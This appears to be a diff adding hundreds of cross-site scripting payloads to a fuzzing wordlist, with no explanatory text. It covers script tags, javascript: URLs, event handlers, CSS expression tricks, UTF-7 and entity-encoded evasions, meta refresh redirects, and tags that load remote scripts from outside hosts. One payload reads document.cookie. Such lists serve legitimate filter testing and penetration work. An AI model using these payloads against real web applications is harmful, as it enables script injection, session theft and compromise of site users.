+<isindex/autofocus/onfocus=confirm()>
+javascript:alert%281%29;
+javascript:confirm(1)
+">/KinG-InFeT.NeT/><script>confirm(document.cookie)</script>
+<;LAYER SRC=";http://www.google.com/scriptlet.html";>;<;/LAYER>;
+<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
+<LAYER SRC="%(scriptlet)s"></LAYER>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:confirm())%7d
+<;LINK REL=";stylesheet"; HREF=";http://www.google.com/xss.css";>;
+<LINK REL="stylesheet" HREF="http://www.google.com/xss.css">
+<LINK REL="stylesheet" HREF="javascript:confirm();">
+<;LINK REL=";stylesheet"; HREF=";javascript:confirm(1);";>;
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+<LINK REL="stylesheet" HREF="javascript:javascript:confirm();">
+<li style=list-style:url() onerror=javascript:confirm()> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:confirm()></div>
+&lt;!&#91;endif&#93;--&gt;
+&lt;!--&#91;if gte IE 4&#93;&gt;
+&lt;A HREF=\"//google\"&gt &lt;/A&gt;
+&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://8.8.8.8/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://google:www.google.com&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.google.com@google&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;BASE HREF=\"javascript&#058;confirm();//\"&gt;
+&lt;BASE HREF=&quot;javascript:confirm(&apos;XSS&apos;);//&quot;&gt;
+&lt;BGSOUND SRC=\"javascript&#058;confirm();\"&gt;
+&lt;BGSOUND SRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;BODY BACKGROUND=\"javascript&#058;confirm()\"&gt;
+&lt;BODY BACKGROUND=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=confirm(\"XSS\")&gt;
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=confirm(&quot;XSS&quot;)&gt;
+&lt;BODY ONLOAD=confirm(&apos;XSS&apos;)&gt;
+&lt;BODY ONLOAD=confirm()&gt;
+&lt;BR SIZE=\"&{confirm()}\"&gt;
+&lt;br size=\&quot;&amp;{confirm(&#039;XSS&#039;)}\&quot;&gt;
+&lt;BR SIZE=&quot;&amp;{confirm(&apos;XSS&apos;)}&quot;&gt;
+&lt;/br style=a:expression(confirm())&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;confirm())\"&gt;
+&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:confirm(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript:confirm(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(confirm(&apos;XSS&apos;));&quot;&gt;
+&lt;DIV STYLE=\"width&#58; expression(confirm());\"&gt;
+&lt;? echo(&apos;&lt;SCR)&apos;;
+&lt;? echo('&lt;SCR)';
+&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+&lt;EMBED SRC=&quot;http://www.google.com/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;confirm();\"&gt;&lt;/FRAMESET&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-confirm();+ADw-/SCRIPT+AD4-
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-confirm(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+&lt;HTML xmlns:xss&gt;
+&lt;!--[if gte IE 4]&gt;               
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+&lt;IFRAME SRC=http://www.google.com/scriptlet.html &lt;
+&lt;IFRAME SRC=\"javascript&#058;confirm();\"&gt;&lt;/IFRAME&gt;
+&lt;IFRAME SRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
+&lt;IMG DYNSRC=\"javascript&#058;confirm()\"&gt;
+&lt;IMG DYNSRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;confirm(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
+&lt;IMG LOWSRC=\"javascript&#058;confirm()\"&gt;
+&lt;IMG LOWSRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;confirm(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
+&lt;IMG SRC=\"http&#58;//www&#46;google&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
+&lt;IMG SRC=\"javascript&#058;confirm()\"
+&lt;IMG SRC=\"   javascript&#058;confirm();\"&gt;
+&lt;IMG SRC=\"javascript&#058;confirm();\"&gt;
+&lt;IMG SRC=javascript&#058;confirm()&gt;
+&lt;IMG SRC=JaVaScRiPt&#058;confirm()&gt;
+&lt;IMG SRC=javascript&#058;confirm(&quot;XSS&quot;)&gt;
+&lt;IMG SRC=`javascript&#058;confirm(\"RSnake says, 'XSS'\")`&gt;
+&lt;IMG SRC=javascript&#058;confirm(String&#46;fromCharCode(88,83,83))&gt;
+&lt;IMG SRC=javascript:confirm(&amp;quot;XSS&amp;quot;)&gt;
+&lt;IMG SRC=javascript:confirm(&apos;XSS&apos;)&gt;
+&lt;IMG SRC=JaVaScRiPt:confirm(&apos;XSS&apos;)&gt;
+&lt;IMG SRC=`javascript:confirm(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
+&lt;IMG SRC=javascript:confirm(String.fromCharCode(88,83,83))&gt;
+&lt;IMG SRC=\"jav&#x09;ascript&#058;confirm();\"&gt;
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;confirm();\"&gt;
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;confirm();\"&gt;
+&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+&lt;IMG SRC=&quot; &amp;#14;  javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;http://www.google.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;javascript:confirm(&apos;XSS&apos;)&quot;
+&lt;IMG SRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&#x09;ascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
+&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
+&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
+&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(confirm(&apos;XSS&apos;))&quot;&gt;
+&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(confirm())\"&gt;
+&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;confirm();\"&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+&lt;LAYER SRC=&quot;http://www.google.com/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://www.google.com/xss.css&quot;&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;confirm();\"&gt;
+&lt;&lt;SCRIPT&gt;confirm(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+&lt;&lt;SCRIPT&gt;confirm(\"XSS\");//&lt;&lt;/SCRIPT&gt;
+&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
+&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://www.google.com/xss.css&gt;; REL=stylesheet&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;confirm(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;confirm();\"
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;confirm();\"&gt;
+&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;confirm()&lt;/SCRIPT&gt;\"&gt;
+&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;confirm()&gt;&lt;/OBJECT&gt;
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:confirm(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
+&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://www.google.com/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
+&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
+&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;a=/XSS/
+&lt;SCRIPT&gt;confirm(&apos;XSS&apos;)&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;confirm();&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;confirm(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;confirm(/XSS/&#46;source)&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;/script&gt;&lt;script&gt;confirm()&lt;/script&gt;
+&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+&lt;SCRIPT SRC=http://www.google.com/xss.js
+&lt;SCRIPT SRC=http://www.google.com/xss.js&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=&quot;http://www.google.com/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=//www.google.com/.j&gt;
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/XSS SRC=&quot;http://www.google.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;scrscriptipt&gt;confirm()&lt;/scrscriptipt&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
+&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;confirm()\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
+&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://www.google.com/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
+&lt;STYLE&gt;@import&apos;http://www.google.com/xss.css&apos;;&lt;/STYLE&gt;
+&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:confirm(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
+&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;confirm(\"XSS\")';&lt;/STYLE&gt;
+&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;confirm()\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:confirm(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:confirm(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:confirm(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
+&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;confirm(&apos;XSS&apos;);&lt;/STYLE&gt;
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;confirm()\")}&lt;/STYLE&gt;
+&lt;STYLE TYPE=\"text/javascript\"&gt;confirm();&lt;/STYLE&gt;
+&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;confirm(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
+&lt;TABLE BACKGROUND=\"javascript&#058;confirm()\"&gt;
+&lt;TABLE BACKGROUND=&quot;javascript:confirm(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;confirm()\"&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:confirm(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+&lt;/TITLE&gt;&lt;SCRIPT&gt;confirm(1);&lt;/SCRIPT&gt;
+&lt;/TITLE&gt;&lt;SCRIPT&gt;confirm(\"XSS\");&lt;/SCRIPT&gt;
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;confirm();\"&gt;&#93;&#93;&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:confirm(&apos;XSS&apos;);&quot;&gt;]]&gt;
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:confirm(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;confirm()\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;XML SRC=&quot;http://www.google.com/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
+'';!--\"&lt;XSS&gt;=&{()}
+&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
+&lt;XSS STYLE=&quot;behavior: url(http://www.google.com/xss.htc);&quot;&gt;
+&lt;XSS STYLE=&quot;xss:expression(confirm(&apos;XSS&apos;))&quot;&gt;
+&lt;XSS STYLE=\"xss&#58;expression(confirm())\"&gt;
+'">><marquee><h1>XSS</h1></marquee>
+'>><marquee><h1>XSS</h1></marquee>
+<marquee onScroll marquee onScroll="javascript:javascript:confirm()"></marquee onScroll>
+<marquee/onstart=confirm()>
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<marquee onstart='javascript:confirm('1');'>
+<marquee onStart marquee onStart="javascript:javascript:confirm()"></marquee onStart>
+<marquee><script>confirm()</script></marquee>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<math href="javascript:javascript:confirm()">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:confirm()">CLICKME</maction> </math>
+<meta charset="mac-farsi">¼script¾javascript:confirm()¼/script¾
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:confirm()&&;&&<&&/script&&>
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; confirm()" http-equiv="refresh"/>
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+<meta HTTP-EQUIV="Link" Content="<http://www.google.com/xss.css>; REL=stylesheet">
+<;META HTTP-EQUIV=";Link"; Content=";<;http://www.google.com/xss.css>;; REL=stylesheet";>;
+<META HTTP-EQUIV="Link" Content="<http://www.google.com/xss.css>; REL=stylesheet">
+<meta http-equiv="refresh" content="0;javascript&colon;confirm()"/>
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:confirm();">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:confirm();\">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:confirm(';XSS';);";>;
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:confirm();">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:confirm();">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:confirm();\">
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:confirm(';XSS';);";>;
+<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
